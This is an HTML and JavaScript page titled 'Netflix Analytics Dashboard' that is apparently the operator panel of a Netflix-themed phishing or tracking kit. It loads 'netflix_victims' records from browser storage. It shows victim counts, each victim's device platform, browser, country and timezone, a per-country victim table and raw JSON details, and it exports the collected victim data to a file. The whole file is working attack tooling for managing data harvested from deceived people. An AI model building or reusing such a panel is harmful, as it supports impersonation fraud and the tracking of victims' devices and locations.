<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Analytics Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #fff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            overflow-x: hidden;
        }
        
        .dashboard {
            min-height: 100vh;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
        }
        
        .header {
            background: rgba(229, 9, 20, 0.1);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo { 
            color: #e50914; 
            font-size: 1.8rem; 
            font-weight: bold; 
        }
        
        .stats-overview {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            padding: 2rem;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: transform 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.08);
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            color: #e50914;
            margin-bottom: 0.5rem;
        }
        
        .stat-label {
            color: #ccc;
            font-size: 0.9rem;
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            padding: 0 2rem 2rem;
        }
        
        .section {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
        }
        
        .section-title {
            color: #e50914;
            margin-bottom: 1rem;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .victims-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .victim-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 0.5rem;
            transition: all 0.3s ease;
        }
        
        .victim-card:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(229, 9, 20, 0.3);
        }
        
        .victim-header {
            display: flex;
            justify-content: between;
            align-items: center;
            margin-bottom: 0.5rem;
        }
        
        .victim-id {
            font-weight: bold;
            color: #e50914;
        }
        
        .victim-time {
            color: #666;
            font-size: 0.8rem;
        }
        
        .victim-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem;
            font-size: 0.9rem;
        }
        
        .info-item {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }
        
        .map-container {
            height: 300px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #666;
            margin-top: 1rem;
        }
        
        .controls {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
        }
        
        .btn {
            background: rgba(229, 9, 20, 0.2);
            color: white;
            border: 1px solid rgba(229, 9, 20, 0.3);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .btn:hover {
            background: rgba(229, 9, 20, 0.3);
        }
        
        .device-chart {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin-top: 1rem;
        }
        
        .chart-item {
            background: rgba(255, 255, 255, 0.03);
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
        }
        
        .chart-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: #e50914;
        }
        
        .chart-label {
            color: #ccc;
            font-size: 0.8rem;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 1rem;
        }
        
        .data-table th,
        .data-table td {
            padding: 0.5rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .data-table th {
            color: #e50914;
            font-weight: 600;
        }
        
        .json-viewer {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.8rem;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <div class="logo">üéØ Netflix Analytics</div>
            <div class="controls">
                <button class="btn" onclick="loadData()">üîÑ Refresh</button>
                <button class="btn" onclick="exportData()">üì§ Export</button>
                <button class="btn" onclick="clearData()">üóëÔ∏è Clear</button>
            </div>
        </div>
        
        <div class="stats-overview">
            <div class="stat-card">
                <div class="stat-number" id="totalVictims">0</div>
                <div class="stat-label">Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="activeToday">0</div>
                <div class="stat-label">Active Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="locationsCount">0</div>
                <div class="stat-label">Locations</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="dataPoints">0</div>
                <div class="stat-label">Data Points</div>
            </div>
        </div>
        
        <div class="main-content">
            <div class="section">
                <div class="section-title">üë• Recent Victims</div>
                <div class="victims-list" id="victimsList">
                    <!-- Victims will be loaded here -->
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">üåç Location Data</div>
                <div class="map-container" id="mapContainer">
                    Location visualization will appear here
                </div>
                <div id="locationStats">
                    <!-- Location stats will be loaded here -->
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">üì± Device Information</div>
                <div class="device-chart">
                    <div class="chart-item">
                        <div class="chart-value" id="desktopCount">0</div>
                        <div class="chart-label">Desktop</div>
                    </div>
                    <div class="chart-item">
                        <div class="chart-value" id="mobileCount">0</div>
                        <div class="chart-label">Mobile</div>
                    </div>
                    <div class="chart-item">
                        <div class="chart-value" id="tabletCount">0</div>
                        <div class="chart-label">Tablet</div>
                    </div>
                    <div class="chart-item">
                        <div class="chart-value" id="otherDevices">0</div>
                        <div class="chart-label">Other</div>
                    </div>
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">üîç Detailed Data</div>
                <div class="json-viewer" id="jsonViewer">
                    Select a victim to view detailed data
                </div>
            </div>
        </div>
    </div>

    <script>
        let victimsData = [];
        
        function loadData() {
            try {
                victimsData = JSON.parse(localStorage.getItem('netflix_victims') || '[]');
                updateDashboard();
            } catch (error) {
                console.error('Error loading data:', error);
            }
        }
        
        function updateDashboard() {
            // Update overview stats
            document.getElementById('totalVictims').textContent = victimsData.length;
            document.getElementById('activeToday').textContent = getTodayCount();
            document.getElementById('locationsCount').textContent = getUniqueLocations();
            document.getElementById('dataPoints').textContent = getTotalDataPoints();
            
            // Update victims list
            updateVictimsList();
            
            // Update device stats
            updateDeviceStats();
            
            // Update location stats
            updateLocationStats();
        }
        
        function getTodayCount() {
            const today = new Date().toDateString();
            return victimsData.filter(v => 
                new Date(v.timestamp).toDateString() === today
            ).length;
        }
        
        function getUniqueLocations() {
            const locations = new Set();
            victimsData.forEach(v => {
                if (v.data?.location?.country) {
                    locations.add(v.data.location.country);
                }
            });
            return locations.size;
        }
        
        function getTotalDataPoints() {
            return victimsData.reduce((total, victim) => {
                return total + Object.keys(victim.data || {}).length * 10;
            }, 0);
        }
        
        function updateVictimsList() {
            const list = document.getElementById('victimsList');
            list.innerHTML = '';
            
            if (victimsData.length === 0) {
                list.innerHTML = '<div class="victim-card">No data collected yet</div>';
                return;
            }
            
            victimsData.slice(-10).reverse().forEach((victim, index) => {
                const card = document.createElement('div');
                card.className = 'victim-card';
                card.onclick = () => showVictimDetails(victim);
                
                const device = victim.data?.device;
                const location = victim.data?.location;
                
                card.innerHTML = `
                    <div class="victim-header">
                        <span class="victim-id">Victim #${victimsData.length - index}</span>
                        <span class="victim-time">${formatTime(victim.timestamp)}</span>
                    </div>
                    <div class="victim-info">
                        <div class="info-item">üì± ${device?.platform || 'Unknown'}</div>
                        <div class="info-item">üåê ${device?.browser?.vendor || 'Unknown'}</div>
                        <div class="info-item">üìç ${location?.country || 'Unknown'}</div>
                        <div class="info-item">üïí ${device?.timezone || 'Unknown'}</div>
                    </div>
                `;
                
                list.appendChild(card);
            });
        }
        
        function updateDeviceStats() {
            const devices = {
                desktop: 0,
                mobile: 0,
                tablet: 0,
                other: 0
            };
            
            victimsData.forEach(victim => {
                const platform = victim.data?.device?.platform?.toLowerCase() || '';
                if (platform.includes('win') || platform.includes('mac') || platform.includes('linux')) {
                    devices.desktop++;
                } else if (platform.includes('mobile') || platform.includes('android') || platform.includes('iphone')) {
                    devices.mobile++;
                } else if (platform.includes('tablet') || platform.includes('ipad')) {
                    devices.tablet++;
                } else {
                    devices.other++;
                }
            });
            
            document.getElementById('desktopCount').textContent = devices.desktop;
            document.getElementById('mobileCount').textContent = devices.mobile;
            document.getElementById('tabletCount').textContent = devices.tablet;
            document.getElementById('otherDevices').textContent = devices.other;
        }
        
        function updateLocationStats() {
            const locationStats = document.getElementById('locationStats');
            const countries = {};
            
            victimsData.forEach(victim => {
                const country = victim.data?.location?.country;
                if (country) {
                    countries[country] = (countries[country] || 0) + 1;
                }
            });
            
            let html = '<table class="data-table"><tr><th>Country</th><th>Victims</th></tr>';
            Object.entries(countries).forEach(([country, count]) => {
                html += `<tr><td>${country}</td><td>${count}</td></tr>`;
            });
            html += '</table>';
            
            locationStats.innerHTML = html;
        }
        
        function showVictimDetails(victim) {
            document.getElementById('jsonViewer').textContent = 
                JSON.stringify(victim, null, 2);
        }
        
        function exportData() {
            const dataStr = JSON.stringify(victimsData, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `netflix_victims_${new Date().toISOString().split('T')[0]}.json`;
            link.click();
            URL.revokeObjectURL(url);
        }
        
        function clearData() {
            if (confirm('Are you sure you want to delete all data?')) {
                localStorage.removeItem('netflix_victims');
                loadData();
            }
        }
        
        function formatTime(timestamp) {
            return new Date(timestamp).toLocaleTimeString();
        }
        
        // Auto-refresh every 10 seconds
        setInterval(loadData, 10000);
        
        // Initial load
        loadData();
    </script>
</body>
</html>
